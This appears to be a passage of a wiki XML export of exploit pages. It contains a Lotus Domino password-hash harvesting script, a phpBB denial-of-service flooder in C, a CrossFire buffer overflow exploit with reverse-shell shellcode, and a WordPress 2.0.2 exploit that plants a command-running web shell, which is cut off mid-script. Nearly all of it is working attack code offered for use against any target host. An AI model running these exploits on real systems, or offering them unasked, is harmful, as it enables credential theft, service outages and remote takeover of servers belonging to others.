# Exploit Author: Jonathan Broche
# Authentication and multi page parsing added by: Alexander Schwankner
# Contact: https://twitter.com/g0jhonny
# Vendor Homepage: https://www-01.ibm.com/software/lotus/category/messaging/
# Tested on: Lotus Domino 8.5
# CVE : CVE-2005-2428

import argparse
import csv
import getpass
import re
import sys

import BeautifulSoup
import requests

requests.packages.urllib3.disable_warnings()

parser = argparse.ArgumentParser(
    description='Domino Effect - A Lotus Domino password hash tool by Jonathan Broche (@g0jhonny) authentication and multi page parsing added by Alexander Schwankner',
    version="1.1")
parser.add_argument('system', help="IP address or hostname to harvest hashes from. ")
parser.add_argument('-n', '--username', metavar='username')
parser.add_argument('-u', '--uri', metavar='path', default="/names.nsf",
                    help="Path to the names.nsf file. [Default: /names.nsf]")
outgroup = parser.add_argument_group(title="Output Options")
outgroup.add_argument('--hashcat', action='store_true', help="Print results for use with hashcat.")
outgroup.add_argument('--john', action='store_true', help="Print results for use with John the Ripper.")
parser.add_argument('-f', '--file', metavar='outputPath', help="Output file in given format.")
parser.add_argument('-c', '--csv', metavar='CSV file with many information about the user')

password = getpass.getpass(prompt='Password: ', stream=None)

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()
print "\nDomino Effect {}\n".format(parser.version)

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.63 Safari/534.3'
}

postData = {'Password': password, 'Username': args.username, 'RedirectTo': '/names.nsf/People?OpenView'}

with requests.Session() as s:
    try:
        response = s.post("https://{}{}?Login".format(args.system, args.uri), verify=False, headers=headers,
                          timeout=3, data=postData)
    except requests.exceptions.Timeout as e:
        print "[!] Timed out, try again."
        sys.exit(1)
    except Exception as e:
        print e

    hashes = {}
    start = 1
    file = open(args.file, 'w')
    i = 0
    algorithm = "not detected"
    if args.csv:
        csvFile = open(args.csv, 'w')
        fieldnames = ['name', 'hash', 'algorithm', 'email', 'ClntMachine', 'ClntPltfrm', 'ClntBld',
                      'HTTPPasswordChangeDate']
        csvWriter = csv.DictWriter(csvFile, fieldnames=fieldnames, dialect='excel')
        csvWriter.writeheader()
    while True:
        try:
            response = s.get("https://{}{}/People?OpenView&amp;Start={}".format(args.system, args.uri, start), verify=False,
                             headers=headers,
                             timeout=3)
        except requests.exceptions.Timeout as e:
            print "[!] Timed out, try again."
            sys.exit(1)
        except Exception as e:
            print e

        soup = BeautifulSoup.BeautifulSoup(response.text)

        start = start + 30
        if 'Keine Dokumente gefunden' in response.text:
            break
        if 'No Document found' in response.text:
            break

        links = []

        # grab all user profile links
        for link in soup.findAll('a'):
            if "OpenDocument" in link['href']:
                if link['href'] not in links:
                    links.append(link['href'])

        for link in links:  # get user profile
            try:
                response = s.get("https://{}{}".format(args.system, link), verify=False, headers=headers, timeout=2)
            except requests.exceptions.Timeout as e:
                pass
            except Exception as e:
                print e

            if response.text:
                soup = BeautifulSoup.BeautifulSoup(response.text)

                name = soup.find('input', {'name': '$dspShortName'}).get('value').strip()  # short name
                httppassword = soup.find('input', {"name": "HTTPPassword"}).get('value').strip()
                dsphttppassword = soup.find('input', {"name": "dspHTTPPassword"}).get('value').strip()
                email = soup.find('input', {"name": "InternetAddress"}).get('value').strip()
                ClntMachine = soup.find('input', {"name": "ClntMachine"}).get('value').strip()
                ClntBld = soup.find('input', {"name": "ClntBld"}).get('value').strip()
                ClntPltfrm = soup.find('input', {"name": "ClntPltfrm"}).get('value').strip()
                HTTPPasswordChangeDate = soup.find('input', {"name": "HTTPPasswordChangeDate"}).get('value').strip()

                if httppassword:
                    hash = httppassword
                elif dsphttppassword:
                    hash = dsphttppassword
                else:
                    print('No passwords found')
                    exit(1)

                # match regex to determinate hash algorithm
                if len(re.findall(r"^[a-f0-9]{32}$", hash, re.MULTILINE)) == 1:
                    algorithm = 'Lotus Notes/Domino 5'
                elif len(re.findall(r"(^[(]{1})([A-Za-z0-9+/]{20})([)]$)", hash, re.MULTILINE)) == 1:
                    algorithm = 'Lotus Notes/Domino 6'
                elif len(re.findall(r"(^[(]{1})([A-Za-z0-9]{49})([)]{1}$)", hash, re.MULTILINE)) == 1:
                    algorithm = 'Lotus Notes/Domino 8'
                else:
                    algorithm = 'not detected'

                if args.csv:
                    csvWriter.writerow(
                        {'name': name,
                         'hash': hash,
                         'algorithm': algorithm,
                         'email': email,
                         'ClntMachine': ClntMachine,
                         'ClntPltfrm': ClntPltfrm,
                         'ClntBld': ClntBld,
                         'HTTPPasswordChangeDate': HTTPPasswordChangeDate})

                i += 1
                print(str(i) + " " + name + " : " + hash)

                if args.hashcat or args.john:
                    if args.hashcat:
                        file.write(hash + "\n")
                    if args.john:
                        file.write("{}:{}\n".format(name, hash))
                else:
                    file.write("[*] User: {} Hash: {}".format(name, hash))

    print
    if args.csv:
        csvFile.close()
        print("extended account information written to " + args.csv)
    file.close()
    print("hashes written to " + args.file + " with hashing algorithm " + algorithm)  # I assume all users have the same hashing algorithm

&lt;/pre&gt;</text>
      <sha1>87g4gp8vhg294q7z6gy8cmis111mwwh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2006-0450 phpBB 2.0.19拒絕服務漏洞</title>
    <ns>0</ns>
    <id>612</id>
    <revision>
      <id>827</id>
      <timestamp>2021-04-01T02:41:44Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== &lt;pre&gt; -------------------------------------------------------- [N]eo [S]ecurity [T]eam [NST]® - Advisory #15 - 00/00/06 ---------------------------------------------..."</comment>
      <origin>827</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9066" sha1="5xeahr5fdospk0rvyqm706edll481zy" xml:space="preserve">==INFO==
&lt;pre&gt;
--------------------------------------------------------
[N]eo [S]ecurity [T]eam [NST]® - Advisory #15 - 00/00/06
--------------------------------------------------------
Program:  phpBB 2.0.15

Homepage:  http://www.phpbb.com

Vulnerable Versions: phpBB 2.0.15 &amp; Lower versions

Risk: High Risk!!

Impact: Multiple DoS Vulnerabilities.

---------------------------------------------------------
- Description
---------------------------------------------------------
phpBB is a high powered, fully scalable, and highly customizable
Open Source bulletin board package. phpBB has a user-friendly
interface, simple and straightforward administration panel, and
helpful FAQ. Based on the powerful PHP server language and your
choice of MySQL, MS-SQL, PostgreSQL or Access/ODBC database servers,
phpBB is the ideal free community solution for all web sites.
- Tested
---------------------------------------------------------
localhost &amp; many forums
- Explotation
---------------------------------------------------------
profile.php &lt;&lt; By registering as many users as you can.
search.php  &lt;&lt; by searching in a way that the db couln't observe it.

CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0450

&lt;/pre&gt;

==NsT-phpBBDoS.c==
&lt;pre&gt;
/*
--------------------------------------------------------
[N]eo [S]ecurity [T]eam [NST]® - Advisory #15 - 00/00/06
--------------------------------------------------------
Program:  phpBB 2.0.15
Homepage:  http://www.phpbb.com
Vulnerable Versions: phpBB 2.0.15 &amp; Lower versions
Risk: High Risk!!
Impact: Multiple DoS Vulnerabilities.

    -==phpBB 2.0.15 Multiple DoS Vulnerabilities==-
---------------------------------------------------------

- Description
---------------------------------------------------------
phpBB is a high powered, fully scalable, and highly customizable
Open Source bulletin board package. phpBB has a user-friendly
interface, simple and straightforward administration panel, and
helpful FAQ. Based on the powerful PHP server language and your
choice of MySQL, MS-SQL, PostgreSQL or Access/ODBC database servers,
phpBB is the ideal free community solution for all web sites.

- Tested
---------------------------------------------------------
localhost &amp; many forums

- Explotation
---------------------------------------------------------
profile.php &lt;&lt; By registering as many users as you can.
search.php  &lt;&lt; by searching in a way that the db couln't observe it.

- Exploit
---------------------------------------------------------
[C Source]

  Name: NsT-phpBBDoS
  Copyright: NeoSecurityteam
  Author: HaCkZaTaN
  Date: 19/06/05
  Description: xD You must figure out the problem xD
  
  root@NeoSecurity:/home/hackzatan# pico NsT-phpBBDoS.c
  root@NeoSecurity:/home/hackzatan# gcc NsT-phpBBDoS.c -o NsT-phpBBDoS
  root@NeoSecurity:/home/hackzatan# ./NsT-phpBBDoS
  [+] NsT-phpBBDoS v0.1 by HaCkZaTaN
  [+] NeoSecurityTeam
  [+] Dos has begun....[+]
  
  [*] Use: ./NsT-phpBBDoS &lt;path&gt; &lt;search.php or profile.php&gt; &lt;Host&gt;
  [*] Example: ./NsT-phpBBDoS /phpBB/ profile.php Victimshost.com
  root@NeoSecurity:/home/hackzatan# ./NsT-phpBBDoS /phpBB/ profile.php Victimshost.com
  [+] NsT-phpBBDoS v0.1 by HaCkZaTaN
  [+] NeoSecurityTeam
  [+] Dos has begun....[+]
  
  .................................
  root@NeoSecurity:/home/hackzatan# echo "Let see how many users I have created"
  root@NeoSecurity:/home/hackzatan# set | grep MACHTYPE
  MACHTYPE=i486-slackware-linux-gnu
  root@NeoSecurity:/home/hackzatan#

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;ctype.h&gt;
#include &lt;errno.h&gt;
#ifdef WIN32
#include &lt;winsock2.h&gt;
#pragma comment(lib, "ws2_32")
#pragma pack(1)
#define WIN32_LEAN_AND_MEAN
#else
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#endif

#define __USE_GNU
#define _XOPEN_SOURCE

int Connection(char *, int);
void Write_In(int , char *, char *a, char *, int);
char Use(char *);

int main(int argc, char *argv[])
{
    int sock, x = 0;
    char *Path = argv[1], *Pro_Sea = argv[2], *Host = argv[3];

    puts("[+] NsT-phpBBDoS v0.1 by HaCkZaTaN");
    puts("[+] NeoSecurityTeam");
    puts("[+] Dos has begun....[+]\n");
    fflush(stdout);

    if(argc != 4) Use(argv[0]);

    while(1)
    {
           sock = Connection(Host,80);
           Write_In(sock, Path, Pro_Sea, Host, x);
           #ifndef WIN32
           shutdown(sock, SHUT_WR);
           close(sock);
           #else
           closesocket(sock);
           WSACleanup();
           #endif
           Pro_Sea = argv[2];
           x++;
    }
    //I don't think that it will get here =) 

    return 0;
}

int Connection(char *Host, int Port)
{
        #ifndef WIN32
        #define SOCKET int
        #define INVALID_SOCKET -1
        #else
        int error;
        WSADATA wsadata;
        error = WSAStartup(MAKEWORD(2, 2), &amp;wsadata);

        if (error == SOCKET_ERROR)
        {
                  perror("Could Not Start Up Winsock!\n");
                  return 0;
        }

        #endif

        SOCKET sockfd;
        struct sockaddr_in sin;
        struct in_addr  *myaddr;
        struct hostent *h;
        
        if(Port &lt;= 0 || Port &gt; 65535)
         {
                  puts("[-] Invalid Port Number\n");
                  fflush(stdout);
                  exit(-1);
         }
        
        if((sockfd =  socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
        {
                    perror("socket() ");
                    fflush (stdout);
                    exit(-1);
        }

        if(isalpha(Host[0]))
        {
           if((h = gethostbyname(Host)) == NULL)
           {
                     perror("gethostbyname() ");
                     fflush (stdout);
                     exit(-1);
           }
        }
        else
        {
              myaddr=(struct in_addr*)malloc(sizeof(struct in_addr));
              myaddr-&gt;s_addr=inet_addr(Host);
              
              if((h = gethostbyaddr((char *) &amp;myaddr, sizeof(myaddr), AF_INET)) != NULL)
              {
                     perror("gethostbyaddr() ");
                     fflush (stdout);
                     exit(-1);
              }
        }

        memset(&amp;sin, 0, sizeof(sin));
        sin.sin_family = AF_INET;
        sin.sin_port = htons(Port);
        memcpy(&amp;sin.sin_addr.s_addr, h-&gt;h_addr_list[0], h-&gt;h_length);

        if(connect(sockfd, (struct sockaddr *)&amp;sin, sizeof(struct sockaddr_in)) &lt; 0)
        {
                     perror("connect() ");
                     exit (-1);
        }

        return sockfd;
}

void Write_In(int sock, char *Path, char *Pro_Sea, char *Host, int x)
{
    char *str1 = (char *)malloc(4*BUFSIZ), *str2 = (char *)malloc(4*BUFSIZ);
    char *req0 = "User-Agent: Mozilla/5.0 (BeOS; U; BeOS X.6; en-US; rv:1.7.8) Gecko/20050511 Firefox/1.0.4\r\n"
                 "Accept: */*\r\n"
                 "Accept-Language: en-us\r\n"
                 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
                 "Accept encoding: gzip,deflate\r\n"
                 "Keep-Alive: 300\r\n"
                 "Proxy-Connection: keep-alive\r\n"
                 "Content-Type: application/x-www-form-urlencoded\r\n"
                 "Cache-Control: no-cache\r\n"
                 "Pragma: no-cache\r\n";
    char *Profile = "%40neosecurityteam.net&amp;new_password=0123456&amp;password_confirm=0123456&amp;icq=&amp;aim=&amp;msn=&amp;yim=&amp;website=&amp;location=&amp;occupation=&amp;interests=&amp;signature=&amp;viewemail=0&amp;hideonline=0&amp;notifyreply=0&amp;notifypm=1&amp;popup_pm=1&amp;attachsig=1&amp;allowbbcode=1&amp;allowhtml=0&amp;allowsmilies=1&amp;language=english&amp;style=1&amp;timezone=0&amp;dateformat=D+M+d%2C+Y+g%3Ai+a&amp;mode=register&amp;agreed=true&amp;coppa=0&amp;submit=Submit\r\n";
    char *Search  = "&amp;search_terms=any&amp;search_author=*&amp;search_forum=-1&amp;search_time=0&amp;search_fields=all&amp;search_cat=-1&amp;sort_by=0&amp;sort_dir=DESC&amp;show_results=topics&amp;return_chars=200\r\n";

    if(strcmp("profile.php", Pro_Sea) == 0) sprintf(str1, "username=NsT__%d&amp;email=NsT__%d%s", x, x, Profile);
    else if(strcmp("search.php", Pro_Sea) == 0)
    {
               Pro_Sea = "search.php?mode=results";
               sprintf(str1, "search_keywords=Hack%d%s", x, Search);
    }
    else
    {
               puts("Sorry. Try making the right choice");
               exit(-1);
    }

    sprintf(str2, "POST %s%s HTTP/1.1\r\n"
                  "Host: %s\r\n"
                  "Referer: http://%s/\r\n%s"
                  "Content-Length: %d\r\n\r\n%s", Path, Pro_Sea, Host, Host, req0, strlen(str1), str1);
          
    write(sock, str2, strlen(str2));
    write(1, ".", 1);
    fflush(stdout);
}

char Use(char *program)
{
	fprintf(stderr,"[*] Use: %s &lt;path&gt; &lt;search.php or profile.php&gt; &lt;Host&gt;\n", program);
	fprintf(stderr,"[*] Example: %s /phpBB/ profile.php Victimshost.com\n", program);
	fflush(stdout);
	exit(-1);
}

/*

@@@@'''@@@@'@@@@@@@@@'@@@@@@@@@@@
'@@@@@''@@'@@@''''''''@@''@@@''@@
'@@'@@@@@@''@@@@@@@@@'''''@@@
'@@'''@@@@'''''''''@@@''''@@@
@@@@''''@@'@@@@@@@@@@''''@@@@@

*/

/* EOF */

&lt;/pre&gt;</text>
      <sha1>5xeahr5fdospk0rvyqm706edll481zy</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2006-1236 CrossFire 1.9.0緩衝區溢出漏洞</title>
    <ns>0</ns>
    <id>613</id>
    <revision>
      <id>828</id>
      <timestamp>2021-04-01T02:43:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Exploit== &lt;pre&gt; import socket import struct  #Script by Wulfzz (Axua)  #offset to ret addr  = 4368 #offset to jmp ecx   = 4198  host = "127.0.0.1" port = 13327  #linux/x86/s..."</comment>
      <origin>828</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1102" sha1="ozoty5nsc2aae6n8b33h7sc5meajdw3" xml:space="preserve">==Exploit==
&lt;pre&gt;
import socket
import struct

#Script by Wulfzz (Axua)

#offset to ret addr  = 4368
#offset to jmp ecx   = 4198

host = "127.0.0.1"
port = 13327

#linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444
shellcode = "\xbe\xc1\x25\xda\x2c\xdd\xc7\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
shellcode +="\x12\x31\x72\x12\x83\xea\xfc\x03\xb3\x2b\x38\xd9\x02\xef\x4b"
shellcode +="\xc1\x37\x4c\xe7\x6c\xb5\xdb\xe6\xc1\xdf\x16\x68\xb2\x46\x19"
shellcode +="\x56\x78\xf8\x10\xd0\x7b\x90\xdd\x22\x7c\x61\x4a\x21\x7c\x70"
shellcode +="\xd6\xac\x9d\xc2\x80\xfe\x0c\x71\xfe\xfc\x27\x94\xcd\x83\x6a"
shellcode +="\x3e\xa0\xac\xf9\xd6\x54\x9c\xd2\x44\xcc\x6b\xcf\xda\x5d\xe5"
shellcode +="\xf1\x6a\x6a\x38\x71"

prefix= "\x11(setup sound "

padding_to_ecx = "\x41" * 4198
padding_to_ret = "\x41" * (170 - len(shellcode))

jmp_ecx = struct.pack("&lt;I", 0x0813C51F) # jmp ecx

payload = prefix + padding_to_ecx + shellcode + padding_to_ret  + jmp_ecx + "\x90" * 8 + "\x00"

#sending payload
s = socket.socket()
s.connect((host, port))

print s.recv(1024)
s.send(payload)
s.close()
print "[*] Payload sent."
&lt;/pre&gt;</text>
      <sha1>ozoty5nsc2aae6n8b33h7sc5meajdw3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2006-2667 WordPress Core 2.0.2 - 'cache' 遠程shell注入漏洞</title>
    <ns>0</ns>
    <id>1657</id>
    <revision>
      <id>2061</id>
      <timestamp>2021-05-03T12:27:04Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/php -q -d short_open_tag=on &lt;? echo "--------------------------------------------------------------------\r\n"; echo "| WordPress &lt;= 2.0.2 'cache' she..."</comment>
      <origin>2061</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="14837" sha1="8uodsk39csdhurceuen163kt71nrtzv" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/php -q -d short_open_tag=on
&lt;?
echo "--------------------------------------------------------------------\r\n";
echo "| WordPress &lt;= 2.0.2 'cache' shell injection exploit               |\r\n";
echo "| by rgod rgod@autistici.org                                       |\r\n";
echo "| site: http://retrogod.altervista.org                             |\r\n";
echo "| dork: inurl:wp-login.php Register Username Password -echo        |\r\n";
echo "--------------------------------------------------------------------\r\n";

/*
this works:
regardless of all php.ini settings,
if user registration is enabled,
against an empty or weak MySQL DB password (read explaination for details...)
*/

if ($argc&lt;6) {
echo "Usage: php ".$argv[0]." host path user pass cmd OPTIONS             \r\n";
echo "host:      target server (ip/hostname)                              \r\n";
echo "path:      path to WordPress                                        \r\n";
echo "cmd:       a shell command                                          \r\n";
echo "user/pass: you need a valid user account                            \r\n";
echo "Options:                                                            \r\n";
echo "   -D[dicrionary] specify a textfile and try dictionary attack      \r\n";
echo "   -p[port]:        \"  a port other than 80                        \r\n";
echo "   -P[ip:port]:     \"  a proxy                                     \r\n";
echo "Examples:                                                           \r\n";
echo "php ".$argv[0]." localhost /wordpress/ your_username password ls -la -Ddic.txt\r\n";
echo "php ".$argv[0]." localhost /wordpress/ your_username password cat ./../../../wp-config.php -p81\r\n";
echo "php ".$argv[0]." localhost / your_username password ls -la -P1.1.1.1:80\r\n\r\n";
die;
}

/* explaination:

  i) wordpress stores some user informations inside cached files
   in wp-content/cache/userlogins/ and wp-content/cache/users/ folders, they are
   php files.
   Normally they look like this:

   &lt;?php
   //O:8:"stdClass":23:{s:2:"ID";s:3:"106";s:10:"user_login";s:6:"suntzu";s:9:"user_pass";s:32:"a2b0f31cd94e749b58307775462e2e4b";s:13:"user_nicename";s:6:"suntzu";s:10:"user_email";s:18:"suntzoi@suntzu.org";s:8:"user_url";s:0:"";s:15:"user_registered";s:19:"2006-05-24 23:00:42";s:19:"user_activation_key";s:0:"";s:11:"user_status";s:1:"0";s:12:"display_name";s:6:"suntzu";s:10:"first_name";s:0:"";s:9:"last_name";s:0:"";s:8:"nickname";s:6:"suntzu";s:11:"description";s:0:"";s:6:"jabber";s:0:"";s:3:"aim";s:0:"";s:3:"yim";s:0:"";s:15:"wp_capabilities";a:1:{s:10:"subscriber";b:1;}s:13:"wp_user_level";s:1:"0";s:10:"user_level";s:1:"0";s:14:"user_firstname";s:0:"";s:13:"user_lastname";s:0:"";s:16:"user_description";s:0:"";}
   ?&gt;

   but...what happens if you inject a carriage return ( chr(13)...), some php code and some
   escape chars when you update your profile (ex. in "displayname" argument)?

   Look at this file now:

   &lt;?php
   //O:8:"stdClass":24:{s:2:"ID";s:3:"106";s:10:"user_login";s:6:"suntzu";s:9:"user_pass";s:32:"a2b0f31cd94e749b58307775462e2e4b";s:13:"user_nicename";s:6:"suntzu";s:10:"user_email";s:17:"suntzu@suntzu.org";s:8:"user_url";s:7:"http://";s:15:"user_registered";s:19:"2006-05-24 23:00:42";s:19:"user_activation_key";s:0:"";s:11:"user_status";s:1:"0";s:12:"display_name";s:185:"suntzu
   error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){$_REQUEST[cmd]=stripslashes($_REQUEST[cmd]);}echo 56789;passthru($_REQUEST[cmd]);echo 56789;//suntzuuuuuuuuuuuuuu";s:10:"first_name";s:6:"suntzu";s:9:"last_name";s:6:"suntzu";s:8:"nickname";s:6:"suntzu";s:11:"description";s:6:"whoami";s:6:"jabber";s:0:"";s:3:"aim";s:0:"";s:3:"yim";s:0:"";s:15:"wp_capabilities";a:1:{s:10:"subscriber";b:1;}s:13:"wp_user_level";s:1:"0";s:10:"user_level";s:1:"0";s:12:"rich_editing";s:4:"true";s:14:"user_firstname";s:6:"suntzu";s:13:"user_lastname";s:6:"suntzu";s:16:"user_description";s:6:"whoami";}
   ?&gt;

   you have a backdoor on target server...

   Now you have to search a way to guess filenames 'cause we have an
   index.php to trivially protect folders, but... guess what?

   give a look at wp-includes/cache.php at line 355:

   ...
   $cache_file = $group_dir.md5($id.DB_PASSWORD).'.php';
   ...

   $group_dir is the folder where files are stored
   DB_PASSWORD costant could be empty, if so...
   you have only to calculate the md5 hash of your user id, then:

   http://[target]/[path]/wp-content/cache/users/[md5(user_id)].php?cmd=ls%20-la

   the same with userlogins/ folder, this time:

   http://[target]/[path]/wp-content/cache/userlogins/[md5(username)].php?cmd=ls%20-la

   otherwise you can check if DB_PASSWORD is in a dictionary through the -D option,
   this tool calculate the hash to do something like this:

   http://[target]/[path]/wp-content/cache/users/[md5([user_id][db_pass])].php?cmd=ls%20-la
   http://[target]/[path]/wp-content/cache/userloginss/[md5([username][db_pass])].php?cmd=ls%20-la

  ii) an ip-spoofing issue in vars.php:

  ...
  // On OS X Server, $_SERVER['REMOTE_ADDR'] is the server's address. Workaround this
  // by using $_SERVER['HTTP_PC_REMOTE_ADDR'], which *is* the remote address.
  if ( isset($_SERVER['HTTP_PC_REMOTE_ADDR']) )
  	$_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_PC_REMOTE_ADDR'];
  ...

  poc:
  you can set an http header like this when you register:

  PC_REMOTE_ADDR: 1.1.1.1
									      */
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i&lt;=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) &lt;= 32 ) | (ord($string[$i]) &gt; 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;

}
$host=$argv[1];
$path=$argv[2];
$username=$argv[3];
$password=$argv[4];
$cmd="";
$port=80;
$proxy="";
$dict="";

for ($i=5; $i&lt;=$argc-1; $i++){
$t=$argv[$i][0].$argv[$i][1];
if (($t&lt;&gt;"-p") and ($t&lt;&gt;"-P") and ($t&lt;&gt;"-D"))
{$cmd.=" ".$argv[$i];}
if ($t=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($t=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($t=="-D")
{
  $dict=str_replace("-D","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]&lt;&gt;'/') or ($path[strlen($path)-1]&lt;&gt;'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

echo "step 0 -&gt; check if suntzu.php is already installed...\r\n";
$check=array("users/suntzu.php",
	     "userlogins/suntzu.php"
	     );
for ($i=0; $i&lt;=count($check)-1; $i++)
{
  $packet="GET ".$p."wp-content/cache/".$check[$i]." HTTP/1.0\r\n";
  $packet.="Host: ".$host."\r\n";
  $packet.="Cookie: cmd=".$cmd."\r\n";
  $packet.="Connection: close\r\n\r\n";
  sendpacketii($packet);
  if (strstr($html,"*DL*"))
  {
    echo "Exploit succeeded...\r\n";$temp=explode("*DL*",$html);echo $temp[1]."\r\n";echo"Now you can launch commands through the followig url:\r\n http://".$host.$path."wp-content/cache/".$check[$i]."?cmd=ls%20-la";die;
  }
}
echo "step 1 -&gt; Login ...\r\n";
$data="log=".urlencode(trim($username));
$data.="&amp;pwd=".urlencode(trim($password));
$data.="&amp;rememberme=forever";
$data.="&amp;submit=".urlencode("Login &amp;raquo;");
$data.="&amp;redirect_to=wp-admin";
$packet="POST ".$p."wp-login.php HTTP/1.0\r\n";
$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n"; //ip spoofing bug in vars.php ;)...
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$temp2=explode(" ",$temp[1]);
$cookie=$temp2[0];
$temp2=explode(" ",$temp[2]);
$cookie.=" ".$temp2[0];
if ($cookie==''){echo "Unable to login...";die;}
else {echo "cookie -&gt;".$cookie."\r\n";}

echo "step 2 -&gt; Retrieve your user id...\r\n";
$packet="GET ".$p."wp-admin/profile.php HTTP/1.0\r\n";
$packet.="PC_REMOTE_ADDR: 1.1.1.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("checkuser_id\" value=\"",$html);
$temp2=explode("\"",$temp[1]);
$user_id=$temp2[0];
if ($user_id==''){die("Unable to retrieve user id...\r\n");}
else {echo "user id -&gt; ".$user_id."\r\n";}

echo "step 3 -&gt; Update your profile with the evil code...\r\n";
$suntzu='$fp=fopen("suntzu.php","w");fputs($fp,chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(114).chr(114).chr(111).chr(114).chr(95).chr(114).chr(101).chr(112).chr(111).chr(114).chr(116).chr(105).chr(110).chr(103).chr(40).chr(48).chr(41).chr(59).chr(115).chr(101).chr(116).chr(95).chr(116).chr(105).chr(109).chr(101).chr(95).chr(108).chr(105).chr(109).chr(105).chr(116).chr(40).chr(48).chr(41).chr(59).chr(105).chr(102).chr(32).chr(40).chr(103).chr(101).chr(116).chr(95).chr(109).chr(97).chr(103).chr(105).chr(99).chr(95).chr(113).chr(117).chr(111).chr(116).chr(101).chr(115).chr(95).chr(103).chr(112).chr(99).chr(40).chr(41).chr(41).chr(123).chr(36).chr(95).chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(61).chr(115).chr(116).chr(114).chr(105).chr(112).chr(115).chr(108).chr(97).chr(115).chr(104).chr(101).chr(115).chr(40).chr(36).chr(95).chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(59).chr(125).chr(101).chr(99).chr(104).chr(111).chr(32).chr(34).chr(42).chr(68).chr(76).chr(42).chr(34).chr(59).chr(112).chr(97).chr(115).chr(115).chr(116).chr(104).chr(114).chr(117).chr(40).chr(36).chr(95).chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(59).chr(63).chr(62));fclose($fp);//';
$suntzu=urlencode($suntzu);
$code='error_reporting(0);set_time_limit(0);if (get_magic_quotes_gpc()){$_REQUEST[cmd]=stripslashes($_REQUEST[cmd]);}echo chr(42).chr(68).chr(76).chr(42);passthru($_REQUEST[cmd]);echo chr(42).chr(68).chr(76).chr(42);';
$code=urlencode($code);
$data="from=profile";
$data.="&amp;checkuser_id=".$user_id;
$data.="&amp;user_login=".urlencode(trim($username));
$data.="&amp;first_name=".urlencode(trim($username));
$data.="&amp;last_name=".urlencode(trim($username)).chr(13).$suntzu."//suntzuuu";
